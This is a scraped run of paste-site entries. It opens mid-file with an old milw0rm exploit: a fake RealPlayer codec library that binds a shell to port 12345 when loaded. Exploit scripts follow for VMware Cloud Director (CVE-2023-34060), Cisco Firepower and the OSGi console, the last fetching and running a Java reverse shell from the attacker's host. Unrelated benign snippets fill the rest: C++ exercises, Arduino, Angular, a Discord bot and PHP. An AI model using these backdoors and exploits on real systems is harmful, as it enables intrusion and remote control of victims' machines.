 * Of course, you don't have to execute a shell.  Do whatever makes you happy.
 *
 * Fix?  `chmod 700 ~/.realnetworks/*`
 *
 *  Copyright (c) 2003, Jon Hart 
 * All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without modification, 
 *  are permitted provided that the following conditions are met:
 *
 *  * Redistributions of source code must retain the above copyright notice, 
 *    this list of conditions and the following disclaimer.
 *  * Redistributions in binary form must reproduce the above copyright notice, 
 *    this list of conditions and the following disclaimer in the documentation 
 *    and/or other materials provided with the distribution.
 *  * Neither the name of the organization nor the names of its contributors may
 *    be used to endorse or promote products derived from this software without 
 *    specific prior written permission.
 *
 *
 *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" 
 *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 *  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
 *  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
 *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
 *  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER 
 *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, 
 *  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE 
 *  USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 *
 *
 *
 */
#define PORT 12345
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

void RAInitEncoder(void) { }
/** This just happens to be one of the first 
 * functions that realplayer calls after cook.so.6.0 is loaded
 */
void RAOpenCodec2(void) { cookthis(); }
void RAOpenCodec(void) {  }
void RAGetNumberOfFlavors(void) {  }
void RACloseCodec(void) {  }
void RADecode(void) {  }
void RAEncode(void) {  }
void RAFreeEncoder(void) {  }
void RAGetNumberOfFlavors2(void) {  }
void RAFreeDecoder(void) {  }
void RAFlush(void) {  }
void RAGetFlavorProperty(void) {  }
void G2(void) { }
void RASetFlavor(void) {  }
void RAInitDecoder(void) {  }
void RACreateEncoderInstance(void) { }

/* Bind /bin/sh to PORT.  It forks
 * and all that good stuff, so it won't 
 * easily go away.
 */
int cookthis() {


        int sock_des, sock_client, sock_recv, sock_len, server_pid, client_pid;
        struct sockaddr_in server_addr; 
        struct sockaddr_in client_addr;

        if ((sock_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
                exit(EXIT_FAILURE); 

        bzero((char *) &server_addr, sizeof(server_addr));
        server_addr.sin_family = AF_INET; 
        server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        server_addr.sin_port = htons(PORT);

        if ((sock_recv = bind(sock_des, (struct sockaddr *) &server_addr, sizeof(server_addr))) != 0) 
                exit(EXIT_FAILURE); 
        if (fork() != 0) 
                exit(EXIT_SUCCESS); 
        setpgrp();  
        signal(SIGHUP, SIG_IGN); 
        if (fork() != 0) 
                exit(EXIT_SUCCESS); 
        if ((sock_recv = listen(sock_des, 5)) != 0)
                exit(EXIT_SUCCESS); 
        while (1) { 
                sock_len = sizeof(client_addr);
                if ((sock_client = accept(sock_des, (struct sockaddr *) &client_addr, &sock_len)) < 0)
                        exit(EXIT_SUCCESS); 
                client_pid = getpid(); 
                server_pid = fork(); 
                if (server_pid != 0) { 
                        dup2(sock_client,0); 
                        dup2(sock_client,1); 
                        dup2(sock_client,2);

                        execl(""/bin/sh"",""realplay"",(char *)0); 
                        close(sock_client); 
                        exit(EXIT_SUCCESS); 
                } 
                close(sock_client);
        }
}




// milw0rm.com [2003-09-09]
            "
EWu21sPH,Untitled,MeehoweCK,C++,Wednesday 13th of March 2024 09:48:15 AM CDT,"#include <iostream>
#include <vector>
#include <map>
#include <cstdlib>
#include <ctime>

void wypiszWektor(const std::vector<short int>& wektor) {
	for (auto i : wektor) {
		std::cout << i << ' ';
	}
	std::cout << std::endl;
}

void sortujWektorLosowo(std::vector<short int>& wektor) {
	std::multimap<short int, short int> mapa{};
	// wstawienie do mapy wartości losowej i wartości z wektora
	for (const auto& i : wektor) {
		mapa.insert(std::make_pair(rand(), i));
	}

	// przeniesienie wartości z mapy do wektora
	auto x{ 0 };
	for (const auto& i : mapa) {
		wektor[x] = i.second;
		++x;
	}
}

int main() {
	srand(time(nullptr));std::vector<short int> wektor;
	wektor.resize(20);
	for (auto i{ 0 }; i < 20; ++i) {
		wektor[i] = i;
	}
	wypiszWektor(wektor);

	sortujWektorLosowo(wektor);
	wypiszWektor(wektor);
	return 0;
}"
HhV4A7pC,Review XFlow Markets,reviewbrokers,PHP,Wednesday 13th of March 2024 09:44:01 AM CDT,https://www.reviewbrokers.net/review-xflow-markets/
SVPmFqPh,seconds_counter.ino,DrAungWinHtut,Arduino,Wednesday 13th of March 2024 09:40:40 AM CDT,"#include <Adafruit_LiquidCrystal.h>

int seconds = 0;
int col = 15;
int digit_count = 0;
int mod = 0;

Adafruit_LiquidCrystal lcd_1(0); // 0 - address offset (default)
                                 // A0 A1 A2 all open

void setup() {
  lcd_1.begin(16, 2);
  lcd_1.setCursor(0, 0); // Set cursor to first line
}

void loop() {
  digit_count = 0; // Reset digit count
  mod = seconds;

  // Count digits in seconds
  do {
    digit_count++;
    mod /= 10;
  } while (mod != 0);

  lcd_1.setCursor(0, 0); // Set cursor to first line
  lcd_1.print(digit_count); // Print digit count

  lcd_1.setCursor(col- digit_count + 1, 1); // Set cursor to second line
  lcd_1.print(seconds); // Print seconds
  
  delay(1000); // Wait for 1 second
  seconds += 1; // Increment seconds
}
"
EW2DQnv3,VMware Cloud Director 10.5 - Bypass Identity Verification - CVE-2023-34060,FlyFar,Python,Wednesday 13th of March 2024 09:38:00 AM CDT,"# Exploit Title: [VMware Cloud Director | Bypass identity verification]
# Google Dork: [non]
# Date: [12/06/2023]
# Exploit Author: [Abdualhadi khalifa](https://twitter.com/absholi_ly)
# Version: [10.5]
# CVE : [CVE-2023-34060]
import requests
import paramiko
import subprocess
import socket
import argparse
import threading

# Define a function to check if a port is open
def is_port_open(ip, port):
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Set the timeout to 1 second
    s.settimeout(1)
    # Try to connect to the port
    try:
        s.connect((ip, port))
        # The port is open
        return True
    except:
        # The port is closed
        return False
    finally:
        # Close the socket
        s.close()

# Define a function to exploit a vulnerable device
def exploit_device(ip, port, username, password, command):
    # Create a ssh client object
    client = paramiko.SSHClient()
    # Set the policy to accept any host key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Connect to the target using the credentials
    client.connect(ip, port, ""root"", ""vmware"", allow_agent=False, look_for_keys=False)
    # Execute the command and get the output
    stdin, stdout, stderr = client.exec_command(command)
    # Print the output
    print(f""The output of the command {command} on the device {ip}:{port} is: {stdout.read().decode()}"")
    # Close the ssh connection
    client.close()


# Parse the arguments from the user
parser = argparse.ArgumentParser(description=""A Python program to detect and exploit the CVE-2023-34060 vulnerability in VMware Cloud Director"")
parser.add_argument(""ip"", help=""The target IP address"")
parser.add_argument(""-p"", ""--ports"", nargs=""+"", type=int, default=[22, 5480], help=""The target ports to check"")
parser.add_argument(""-u"", ""--username"", default=""root"", help=""The username for ssh"")
parser.add_argument(""-w"", ""--password"", default=""vmware"", help=""The password for ssh"")
parser.add_argument(""-c"", ""--command"", default=""hostname"", help=""The command to execute on the vulnerable devices"")
args = parser.parse_args()

# Loop through the ports and check for the vulnerability
for port in args.ports:
    # Check if the port is open
    if is_port_open(args.ip, port):
        # The port is open, send a GET request to the port and check the status code
        response = requests.get(f""http://{args.ip}:{port}"")
        if response.status_code == 200:
            # The port is open and vulnerable
            print(f""Port {port} is vulnerable to CVE-2023-34060"")
            # Create a thread to exploit the device
            thread = threading.Thread(target=exploit_device, args=(args.ip, port, args.username, args.password, args.command))
            # Start the thread
            thread.start()
        else:
            # The port is open but not vulnerable
            print(f""Port {port} is not vulnerable to CVE-2023-34060"")
    else:
        # The port is closed
        print(f""Port {port} is closed"")
            "
PZ7kLFdF,Cisco Firepower Management Center < 6.6.7.1 - Authenticated RCE - CVE-2023-20048,FlyFar,Python,Wednesday 13th of March 2024 09:34:54 AM CDT,"# Exploit Title: [Cisco Firepower Management Center]
# Google Dork: [non]
# Date: [12/06/2023]
# Exploit Author: [Abdualhadi khalifa](https://twitter.com/absholi_ly)
# Version: [6.2.3.18"", ""6.4.0.16"", ""6.6.7.1]
# CVE : [CVE-2023-20048]

import requests
import json

# set the variables for the URL, username, and password for the FMC web services interface
fmc_url = ""https://fmc.example.com""
fmc_user = ""admin""
fmc_pass = ""cisco123""

# create a requests session to handle cookies and certificate verification
session = requests.Session()
session.verify = False

# send a POST request to the /api/fmc_platform/v1/auth/generatetoken endpoint to get the access token and refresh token
token_url = fmc_url + ""/api/fmc_platform/v1/auth/generatetoken""
response = session.post(token_url, auth=(fmc_user, fmc_pass))

# check the response status and extract the access token and refresh token from the response headers
# set the access token as the authorization header for the subsequent requests
try:
    if response.status_code == 200:
        access_token = response.headers[""X-auth-access-token""]
        refresh_token = response.headers[""X-auth-refresh-token""]
        session.headers[""Authorization""] = access_token
    else:
        print(""Failed to get tokens, status code: "" + str(response.status_code))
        exit()
except Exception as e:
    print(e)
    exit()

# set the variable for the domain id
# change this to your domain id
domain_id = ""e276abec-e0f2-11e3-8169-6d9ed49b625f""

# send a GET request to the /api/fmc_config/v1/domain/{DOMAIN_UUID}/devices/devicerecords endpoint to get the list of devices managed by FMC
devices_url = fmc_url + ""/api/fmc_config/v1/domain/"" + domain_id + ""/devices/devicerecords""
response = session.get(devices_url)

# check the response status and extract the data as a json object
try:
    if response.status_code == 200:
        data = response.json()
    else:
        print(""Failed to get devices, status code: "" + str(response.status_code))
        exit()
except Exception as e:
    print(e)
    exit()

# parse the data to get the list of device names and URLs
devices = []
for item in data[""items""]:
    device_name = item[""name""]
    device_url = item[""links""][""self""]
    devices.append((device_name, device_url))

# loop through the list of devices and send a GET request to the URL of each device to get the device details
for device in devices:
    device_name, device_url = device
    response = session.get(device_url)

    # check the response status and extract the data as a json object
    try:
        if response.status_code == 200:
            data = response.json()
        else:
            print(""Failed to get device details, status code: "" + str(response.status_code))
            continue
    except Exception as e:
        print(e)
        continue

    # parse the data to get the device type, software version, and configuration URL
    device_type = data[""type""]
    device_version = data[""metadata""][""softwareVersion""]
    config_url = data[""metadata""][""configURL""]

    # check if the device type is FTD and the software version is vulnerable to the CVE-2023-20048 vulnerability
    # use the values from the affected products section in the security advisory
    if device_type == ""FTD"" and device_version in [""6.2.3.18"", ""6.4.0.16"", ""6.6.7.1""]:
        print(""Device "" + device_name + "" is vulnerable to CVE-2023-20048"")

        # create a list of commands that you want to execute on the device
        commands = [""show version"", ""show running-config"", ""show interfaces""]
        device_id = device_url.split(""/"")[-1]

        # loop through the list of commands and send a POST request to the /api/fmc_config/v1/domain/{DOMAIN_UUID}/devices/devicerecords/{DEVICE_ID}/operational/command/{COMMAND} endpoint to execute each command on the device
        # replace {DOMAIN_UUID} with your domain id, {DEVICE_ID} with your device id, and {COMMAND} with the command you want to execute
        for command in commands:
            command_url = fmc_url + ""/api/fmc_config/v1/domain/"" + domain_id + ""/devices/devicerecords/"" + device_id + ""/operational/command/"" + command
            response = session.post(command_url)

            # check the response status and extract the data as a json object
            try:
                if response.status_code == 200:
                    data = response.json()
                else:
                    print(""Failed to execute command, status code: "" + str(response.status_code))
                    continue
            except Exception as e:
                print(e)
                continue

            # parse the data to get the result of the command execution and print it
            result = data[""result""]
            print(""Command: "" + command)
            print(""Result: "" + result)

    else:
        print(""Device "" + device_name + "" is not vulnerable to CVE-2023-20048"")
            "
mixC7b5a,OSGi v3.8-3.18 Console - RCE,FlyFar,Python,Wednesday 13th of March 2024 09:31:55 AM CDT,"#!/usr/bin/python

# Exploit Title: [OSGi v3.8-3.18 Console RCE]
# Date: [2023-07-28]
# Exploit Author: [Andrzej Olchawa, Milenko Starcik,
#                  VisionSpace Technologies GmbH]
# Exploit Repository:
#           [https://github.com/visionspacetec/offsec-osgi-exploits.git]
# Vendor Homepage: [https://eclipse.dev/equinox]
# Software Link: [https://archive.eclipse.org/equinox/]
# Version: [3.8 - 3.18]
# Tested on: [Linux kali 6.3.0-kali1-amd64]
# License: [MIT]
#
# Usage:
# python exploit.py --help
#
# Example:
# python exploit.py --rhost=192.168.0.133 --rport=1337 --lhost=192.168.0.100 \
#                                                      --lport=4444

""""""
This is an exploit that allows to open a reverse shell connection from
the system running OSGi v3.8-3.18 and earlier.
""""""
import argparse
import socket
import sys
import threading

from functools import partial
from http.server import BaseHTTPRequestHandler, HTTPServer

# Stage 1 of the handshake message
HANDSHAKE_STAGE_1 = \
    b""\xff\xfd\x01\xff\xfd"" \
    b""\x03\xff\xfb\x1f\xff"" \
    b""\xfa\x1f\x00\x74\x00"" \
    b""\x37\xff\xf0\xff\xfb"" \
    b""\x18""

# Stage 2 of the handshake message
HANDSHAKE_STAGE_2 = \
    b""\xff\xfa\x18\x00\x58"" \
    b""\x54\x45\x52\x4d\x2d"" \
    b""\x32\x35\x36\x43\x4f"" \
    b""\x4c\x4f\x52\xff\xf0""

# The buffer of this size is enough to handle the telnet handshake
BUFFER_SIZE = 2 * 1024


class HandlerClass(BaseHTTPRequestHandler):
    """"""
    This class overrides the BaseHTTPRequestHandler. It provides a specific
    functionality used to deliver a payload to the target host.
    """"""

    _lhost: str
    _lport: int

    def __init__(self, lhost, lport, *args, **kwargs):
        self._lhost = lhost
        self._lport = lport

        super().__init__(*args, **kwargs)

    def _set_response(self):
        self.send_response(200)
        self.send_header(""Content-type"", ""text/html"")
        self.end_headers()

    def do_GET(self):  # pylint: disable=C0103
        """"""
        This method is responsible for the playload delivery.
        """"""

        print(""Delivering the payload..."")

        self._set_response()
        self.wfile.write(generate_revshell_payload(
            self._lhost, self._lport).encode('utf-8'))

        raise KeyboardInterrupt

    def log_message(self, format, *args):  # pylint: disable=W0622
        """"""
        This method redefines a built-in method to suppress
        BaseHTTPRequestHandler log messages.
        """"""

        return


def generate_revshell_payload(lhost, lport):
    """"""
    This function generates the Revershe Shell payload that will
    be executed on the target host.
    """"""

    payload = \
        ""import java.io.IOException;import java.io.InputStream;"" \
        ""import java.io.OutputStream;import java.net.Socket;"" \
        ""class RevShell {public static void main(String[] args) "" \
        ""throws Exception { String host=\""%s\"";int port=%d;"" \
        ""String cmd=\""sh\"";Process p=new ProcessBuilder(cmd)."" \
        ""redirectErrorStream(true).start();Socket s=new Socket(host,port);"" \
        ""InputStream pi=p.getInputStream(),pe=p.getErrorStream(), "" \
        ""si=s.getInputStream();OutputStream po=p.getOutputStream(),"" \
        ""so=s.getOutputStream();while(!s.isClosed()){while(pi.available()"" \
        "">0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());"" \
        ""while(si.available()>0)po.write(si.read());so.flush();po.flush();"" \
        ""Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};"" \
        ""p.destroy();s.close();}}\n"" % (
            lhost, lport)

    return payload


def run_payload_delivery(lhost, lport):
    """"""
    This function is responsible for payload delivery.
    """"""

    print(""Setting up the HTTP server for payload delivery..."")

    handler_class = partial(HandlerClass, lhost, lport)

    server_address = ('', 80)
    httpd = HTTPServer(server_address, handler_class)

    try:
        print(""[+] HTTP server is running."")

        httpd.serve_forever()
    except KeyboardInterrupt:
        print(""[+] Payload delivered."")
    except Exception as err:  # pylint: disable=broad-except
        print(""[-] Failed payload delivery!"")
        print(err)
    finally:
        httpd.server_close()


def generate_stage_1(lhost):
    """"""
    This function generates the stage 1 of the payload.
    """"""

    stage_1 = b""fork \""curl http://%s -o ./RevShell.java\""\n"" % (
        lhost.encode()
    )

    return stage_1


def generate_stage_2():
    """"""
    This function generates the stage 2 of the payload.
    """"""

    stage_2 = b""fork \""java ./RevShell.java\""\n""

    return stage_2


def establish_connection(rhost, rport):
    """"""
    This function creates a socket and establishes the connection
    to the target host.
    """"""

    print(""[*] Connecting to OSGi Console..."")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((rhost, rport))
    print(""[+] Connected."")

    return sock


def process_handshake(sock):
    """"""
    This function process the handshake with the target host.
    """"""

    print(""[*] Processing the handshake..."")
    sock.recv(BUFFER_SIZE)
    sock.send(HANDSHAKE_STAGE_1)
    sock.recv(BUFFER_SIZE)
    sock.send(HANDSHAKE_STAGE_2)
    sock.recv(BUFFER_SIZE)
    sock.recv(BUFFER_SIZE)


def deliver_payload(sock, lhost):
    """"""
    This function executes the first stage of the exploitation.
    It triggers the payload delivery mechanism to the target host.
    """"""

    stage_1 = generate_stage_1(lhost)

    print(""[*] Triggering the payload delivery..."")
    sock.send(stage_1)
    sock.recv(BUFFER_SIZE)
    sock.recv(BUFFER_SIZE)


def execute_payload(sock):
    """"""
    This function executes the second stage of the exploitation.
    It sends payload which is responsible for code execution.
    """"""

    stage_2 = generate_stage_2()

    print(""[*] Executing the payload..."")
    sock.send(stage_2)
    sock.recv(BUFFER_SIZE)
    sock.recv(BUFFER_SIZE)
    print(""[+] Payload executed."")


def exploit(args, thread):
    """"""
    This function sends the multistaged payload to the tareget host.
    """"""

    try:
        sock = establish_connection(args.rhost, args.rport)

        process_handshake(sock)
        deliver_payload(sock, args.lhost)

        # Join the thread running the HTTP server
        # and wait for payload delivery
        thread.join()

        execute_payload(sock)

        sock.close()

        print(""[+] Done."")
    except socket.error as err:
        print(""[-] Could not connect!"")
        print(err)
        sys.exit()


def parse():
    """"""
    This fnction is used to parse and return command-line arguments.
    """"""

    parser = argparse.ArgumentParser(
        prog=""OSGi-3.8-console-RCE"",
        description=""This tool will let you open a reverse shell from the ""
                    ""system that is running OSGi with the '-console' ""
                    ""option in versions between 3.8 and 3.18."",
        epilog=""Happy Hacking! :)"",
    )

    parser.add_argument(""--rhost"", dest=""rhost"",
                        help=""remote host"", type=str, required=True)
    parser.add_argument(""--rport"", dest=""rport"",
                        help=""remote port"", type=int, required=True)
    parser.add_argument(""--lhost"", dest=""lhost"",
                        help=""local host"", type=str, required=False)
    parser.add_argument(""--lport"", dest=""lport"",
                        help=""local port"", type=int, required=False)
    parser.add_argument(""--version"", action=""version"",
                        version=""%(prog)s 0.1.0"")

    return parser.parse_args()


def main(args):
    """"""
    Main fuction.
    """"""

    thread = threading.Thread(
        target=run_payload_delivery, args=(args.lhost, args.lport))
    thread.start()

    exploit(args, thread)


if __name__ == ""__main__"":
    main(parse())
            "
juvaVHW5,Javascript code,HG71,JavaScript,Wednesday 13th of March 2024 09:26:12 AM CDT,"const command = ""purge"";
const {
  SlashCommandBuilder,
  EmbedBuilder,
  PermissionFlagsBits,
} = require(""discord.js"");
const wait = require(""node:timers/promises"").setTimeout;

module.exports = {
  data: new SlashCommandBuilder()
    .setName(command)
    .setDescription(""Purges given amount of messages in the current channel."")
    .addIntegerOption((option) =>
      option
        .setName(""amount"")
        .setDescription(""Enter the amount of messages to purge"")
        .setRequired(true),
    )
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages),

  async execute(interaction, client) {
    const amount = interaction.options.getInteger(""amount"");
    const messageDate = await interaction.channel.messages.fetch({
      limit: amount,
    });
    const oldestAllowed = new Date(Date.now() - 1209600000);
    const olderMessages = messageDate.filter(msg => msg.createdTimestamp < oldestAllowed);
    if (
      !interaction.member.permissions.has(PermissionFlagsBits.ManageMessages)
    ) {
      const permissionEmbed = new EmbedBuilder()
        .setTitle(""Unsuccessful"")
        .setDescription(
          `<:premio_cross:953933167713206372> Couldn't purge messages.`,
        )
        .addFields({
          name: ""Reason:"",
          value: ""You don't have the permission to purge messages."",
        })
        .setColor(0xff0000)
        .setTimestamp()
        .setFooter({
          text: `Command Name: /${command}`,
          iconURL: interaction.user.displayAvatarURL(),
        });
      await interaction.reply({
        embeds: [permissionEmbed],
        ephemeral: true,
      });
    } else if (amount > 100 || amount < 1) {
      const limitEmbed = new EmbedBuilder()
        .setTitle(""Unsuccessful"")
        .setDescription(
          `<:premio_cross:953933167713206372> Couldn't purge messages.`,
        )
        .addFields({ name: ""Reason:"", value: ""Purge limit is 1 to 100."" })
        .setColor(0xff0000)
        .setTimestamp()
        .setFooter({
          text: `Command Name: /${command}`,
          iconURL: interaction.user.displayAvatarURL(),
        });
      await interaction.reply({
        embeds: [limitEmbed],
        ephemeral: true,
      });
    } else if (olderMessages.size > 0) {
      const oldEmbed = new EmbedBuilder()
        .setTitle(""Unsuccessful"")
        .setDescription(
          `<:premio_cross:953933167713206372> Couldn't purge messages.`,
        )
        .addFields({
          name: ""Reason:"",
          value: ""Messages are older than 2 weeks (14 days)."",
        })
        .setColor(0xff0000)
        .setTimestamp()
        .setFooter({
          text: `Command Name: /${command}`,
          iconURL: interaction.user.displayAvatarURL(),
        });
      await interaction.reply({
        embeds: [oldEmbed],
        ephemeral: true,
      });
    } else {
      try {
        const successEmbed = new EmbedBuilder()
          .setTitle(""Success"")
          .setDescription(
            `<:premio_tick:953933114533609492> Purged \`${amount}\` messages from ${interaction.channel}.`,
          )
          .setColor(0x89ff00)
          .setTimestamp()
          .setFooter({
            text: `Command Name: /${command}`,
            iconURL: interaction.user.displayAvatarURL(),
          });
        await interaction.channel.bulkDelete(amount, true);
        await interaction.reply({
          embeds: [successEmbed],
        });
      } catch (error) {
        const fError = new EmbedBuilder()
          .setTitle(""Unsuccessful"")
          .setDescription(
            `<:premio_cross:953933167713206372> Couldn't purge messages.`,
          )
          .addFields({
            name: ""Reason:"",
            value:
              ""Unknown error. Please contact [support server](https://discord.gg)"",
          })
          .setColor(0xff0000)
          .setTimestamp()
          .setFooter({
            text: `Command Name: /${command}`,
            iconURL: interaction.user.displayAvatarURL(),
          });
        await interaction.reply({
          embeds: [fError],
          ephemeral: true,
        });
      }
    }
  },
};
"
ANFBUuyM,CS2 Skeet / Gamesense config HvH and more,Shifu_,Lua,Wednesday 13th of March 2024 09:21:23 AM CDT,"https://discord.gg/cs3uAQ2vcK
 
Free config! Share yours :D"
J8gG7mFJ,precision,mayankjoin3,Python,Wednesday 13th of March 2024 08:41:14 AM CDT,"def format_decimal(number, precision):
    """"""
    Format a decimal number to a specific precision.

    Args:
        number (float): The decimal number to be formatted.
        precision (int): The desired number of decimal places.

    Returns:
        str: The formatted decimal number.
    """"""
    return f""{number:.{precision}f}""

# Example usage:
number = 3.141592653589793
precision = 3
formatted_number = format_decimal(number, precision)
print(formatted_number)  # Output: 3.142
"
Nqct1S7f,Untitled,nshelper,PHP,Wednesday 13th of March 2024 08:40:35 AM CDT,"	foreach ( $results as $key => $post ) {
		if ( $wc_activated && ( $post->post_type === 'product' || $post->post_type === 'product_variation' ) ) {
            do_action( 'woocommerce/cart_loop/start', $post );
			$product = wc_get_product( $post );

			if ( $product->get_parent_id() ) {
				$parent_product = wc_get_product( $product->get_parent_id() );
				$visible        = $parent_product->get_catalog_visibility() === 'visible' || $parent_product->get_catalog_visibility() === 'search';
				if ( $parent_product->get_status() !== 'publish' || ! $visible ) {
					unset( $results[ $key ] );
					continue;
				}
			}

			$product_image = wp_get_attachment_image_src( get_post_thumbnail_id( $product->get_id() ) );

			$suggestions[] = array(
				'type'  => 'Product',
				'id'    => $product->get_id(),
				'value' => $product->get_title(),
				'url'   => $product->get_permalink(),
				'img'   => $product_image ? $product_image[0] : '',
				'price' => $product->get_price_html(),
			);
            do_action( 'woocommerce/cart_loop/end', $post );
		} else {
			$suggestions[] = array(
				'type'  => 'Page',
				'id'    => $post->ID,
				'value' => get_the_title( $post->ID ),
				'url'   => get_the_permalink( $post->ID ),
				'img'   => get_the_post_thumbnail_url( $post->ID, 'thumbnail' ),
				'price' => '',
			);
		}
	}"
w2hGwnaB,Untitled,D3ENNY,TypeScript,Wednesday 13th of March 2024 08:33:14 AM CDT,"<section class=""bg-obsidian mb-10 grid place-items-center"">
    <p class=""text-oil-50 uppercase text-center text-4xl"">le nostre bottiglie</p>
    @defer (on viewport) {
        <div id=""bottle"" class=""flex flex-wrap justify-center items-center gap-20 h-full animate-slide"">
            <div class=""text-center"">
                <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
                <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 1</p>
            </div>
            <div class=""text-center"">
                <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
                <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 2</p>
            </div>
            <div class=""text-center"">
                <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
                <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 3</p>
            </div>
        </div>
    }@placeholder {
        <div id=""bottle"" class=""flex flex-wrap justify-center items-center gap-20 h-full"">
            <div class=""text-center"">
                <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
                <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 1</p>
            </div>
            <div class=""text-center"">
                <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
                <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 2</p>
            </div>
            <div class=""text-center"">
                <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
                <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 3</p>
            </div>
        </div>
    }
</section>

"
VXL0MCMy,Untitled,D3ENNY,TypeScript,Wednesday 13th of March 2024 07:59:24 AM CDT,"<section class=""bg-obsidian mb-10 grid place-items-center"">
    <p class=""text-oil-50 uppercase text-center text-4xl"">le nostre bottiglie</p>
    <div VisibilityAnimation (onDivEnterViewport)=""onViewport()"" id=""bottle"" class=""flex flex-wrap justify-center items-center gap-20 h-full animate-slide"">
        <div class=""text-center"">
            <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
            <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 1</p>
        </div>
        <div class=""text-center"">
            <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
            <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 2</p>
        </div>
        <div class=""text-center"">
            <img src=""../../../assets/img/oilBottle.png"" alt="""" class=""brightness-75 saturate-50 drop-shadow-oil-900"">
            <p class=""text-oil-200 -mt-20 text-2xl"">nome olio 3</p>
        </div>
    </div>
</section>



/****************************************/


import { Component } from '@angular/core';
import { VisibilityAnimationDirective } from '../../shared/directive/visibility-animation.directive';

@Component({
  selector: 'app-home-product',
  standalone: true,
  imports: [VisibilityAnimationDirective],
  templateUrl: './home-product.component.html',
  styleUrls: ['./home-product.component.scss']
})
export class HomeProductComponent {

  ngOnInit(){
    console.log(""init"");
    
  }

  onViewport() {
    console.log('Il div è entrato nel viewport!');
  }

}


/*********************************************/


import { Directive, ElementRef, HostListener, Input, Output, EventEmitter } from '@angular/core';


@Directive({
  selector: '[appVisibilityAnimation]',
  standalone: true
})
export class VisibilityAnimationDirective {

  @Input() onDivEnterViewport!: Function

  constructor(private elementRef: ElementRef) {}

  @HostListener('window:scroll', [])
  onScroll() {
    const boundingClientRect = this.elementRef.nativeElement.getBoundingClientRect();

    if (boundingClientRect.top < window.innerHeight && boundingClientRect.bottom > 0) {
      // Il div è entrato nel viewport
      console.log(""scrolling"");
      
      this.onDivEnterViewport();
    }
  }

}"
6YUTwMFe,СПРИНТ № 6 | Профилируем и ускоряем | Урок 3: Измеряем время,chevengur,C++,Wednesday 13th of March 2024 07:31:14 AM CDT,"#include <cstdlib>
#include <iostream>
#include <vector>
#include <chrono>

using namespace std;

vector<int> ReverseVector(const vector<int>& source_vector) {
    vector<int> res;
    for (int i : source_vector) {
        res.insert(res.begin(), i);
    }

    return res;
}

int CountPops(const vector<int>& source_vector, int begin, int end) {
    int res = 0;

    for (int i = begin; i < end; ++i) {
        if (source_vector[i]) {
            ++res;
        }
    }

    return res;
}

void AppendRandom(vector<int>& v, int n) {
    for (int i = 0; i < n; ++i) {
        // получаем случайное число с помощью функции rand.
        // с помощью (rand() % 2) получим целое число в диапазоне 0..1.
        // в C++ имеются более современные генераторы случайных чисел,
        // но в данном уроке не будем их касаться
        v.push_back(rand() % 2);
    }
}

void Operate() {
    vector<int> random_bits;

    // операция << для целых чисел это сдвиг всех бит в двоичной
    // записи числа. Запишем с её помощью число 2 в степени 17 (131072)
    static const int N = 1 << 17;

    // заполним вектор случайными числами 0 и 1
    const chrono::steady_clock::time_point start_time_append = chrono::steady_clock::now(); 
    AppendRandom(random_bits, N);
    const chrono::steady_clock::time_point end_time_append = chrono::steady_clock::now();
    const chrono::steady_clock::duration duration_append_random = end_time_append - start_time_append;

    
    // перевернём вектор задом наперёд
    const chrono::steady_clock::time_point start_time_reverse = chrono::steady_clock::now();
    vector<int> reversed_bits = ReverseVector(random_bits);
    const chrono::steady_clock::time_point end_time_reverse = chrono::steady_clock::now();
    const chrono::steady_clock::duration duration_reverse_vector = end_time_reverse - start_time_reverse;

    // посчитаем процент единиц на начальных отрезках вектора
    const chrono::steady_clock::time_point start_time_counting = chrono::steady_clock::now();
    for (int i = 1, step = 1; i <= N; i += step, step *= 2) {
